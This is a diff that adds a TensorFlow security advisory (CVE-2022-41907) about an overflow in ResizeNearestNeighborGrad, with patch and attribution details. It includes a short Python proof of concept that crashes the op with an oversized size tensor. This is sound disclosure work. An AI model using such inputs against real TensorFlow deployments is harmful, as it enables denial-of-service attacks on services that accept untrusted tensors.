@@ -1,0 +1,20 @@
+<h2>TFSA-2022-149: Overflow in <code>ResizeNearestNeighborGrad</code></h2>
+<h3>CVE Number</h3>
+<p>CVE-2022-41907</p>
+<h3>Impact</h3>
+<p>When <a href="https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/kernels/image/resize_nearest_neighbor_op.cc"><code>tf.raw_ops.ResizeNearestNeighborGrad</code></a> is given a large <code>size</code> input, it overflows.
+```
+import tensorflow as tf</p>
+<p>align_corners = True
+half_pixel_centers = False
+grads = tf.constant(1, shape=[1,8,16,3], dtype=tf.float16)
+size = tf.constant([1879048192,1879048192], shape=[2], dtype=tf.int32)
+tf.raw_ops.ResizeNearestNeighborGrad(grads=grads, size=size, align_corners=align_corners, half_pixel_centers=half_pixel_centers)
+```</p>
+<h3>Patches</h3>
+<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/00c821af032ba9e5f5fa3fe14690c8d28a657624">00c821af032ba9e5f5fa3fe14690c8d28a657624</a>.</p>
+<p>The fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.</p>
+<h3>For more information</h3>
+<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
+<h3>Attribution</h3>
+<p>This vulnerability has been reported by Neophytos Christou from the Secure Systems Lab (SSL) at Brown University.</p>
